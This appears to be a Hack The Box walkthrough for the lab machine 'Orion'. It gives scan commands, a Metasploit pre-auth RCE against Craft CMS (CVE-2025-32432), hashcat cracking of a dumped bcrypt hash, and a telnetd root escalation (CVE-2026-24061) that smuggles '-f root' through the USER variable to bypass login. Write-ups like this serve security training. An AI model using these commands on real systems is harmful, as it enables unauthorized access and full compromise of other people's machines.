Hack The Box

Orion

Level: Easy

Summary of the attack path:

  • Craft CMS 5.6.16 — pre-auth RCE via CVE-2025-32432.
  • Recovered database credentials, dumped a user hash and cracked it with hashcat.
  • Local privilege escalation through a vulnerable Telnet (GNU inetutils) 2.7 service — CVE-2026-24061.

1. Enumeration

We start with port enumeration:

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.64.239
  • -p- --open: Scans all ports and shows only the open ones.
  • -sS: SYN stealth scan.
  • -Pn: Skips host discovery (treats the host as up).
  • -vvv: Maximum verbosity for real-time results.

Ports 22 (SSH) and 80 (HTTP) are open. We add the domain orion.htb to our /etc/hosts and fuzz for directories with ffuf:

ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://orion.htb/FUZZ

This reveals an admin directory. The site runs Craft CMS 5.6.16.

2. Foothold

Craft CMS 5.6.16 is vulnerable to CVE-2025-32432, a pre-auth remote code execution bug. We use the Metasploit module for it:

msfconsole -q msf > search Craftcms msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options ...

This gives us a Meterpreter session. We drop to a shell and upgrade it:

meterpreter > shell python3 -c 'import pty; pty.spawn("/bin/bash")'

In /etc/passwd we find two interesting users: root and adam.

By reading the environment variables with the env command, we find a password:

SuperSecureCraft123Pass!

These credentials log us in to the database:

mysql -u root -p Enter password: SuperSecureCraft123Pass!

We browse the orion database and read the users table:

MariaDB [(none)]> show databases; MariaDB [(none)]> use orion; MariaDB [orion]> select * from users;

Here we find a password hash for the user adam (email adam@orion.htb):

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

We crack it with hashcat (bcrypt, mode 3200):

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
Credentials adam : darkangel

These credentials give us SSH access as adam, where we find the user flag.

3. Privilege Escalation

After logging in as adam, we check the running services:

ss -tulpn

A service is listening on port 23, which is normally Telnet. We check the version:

telnet -V telnet (GNU inetutils) 2.7

This version of Telnet is vulnerable to a local privilege escalation (CVE-2026-24061). The quickest way to abuse it is a single command:

USER="-f root" telnet -a 127.0.0.1 23
  • USER="-f root": The server passes the user-supplied USER environment variable straight into /usr/bin/login without checking it, so it runs login -f root. The -f flag skips the password check and logs the user in immediately.
  • -a, --login: Attempt automatic login.

So we tell the system to use the root user, skip the password check, and log in automatically — giving us a root shell.
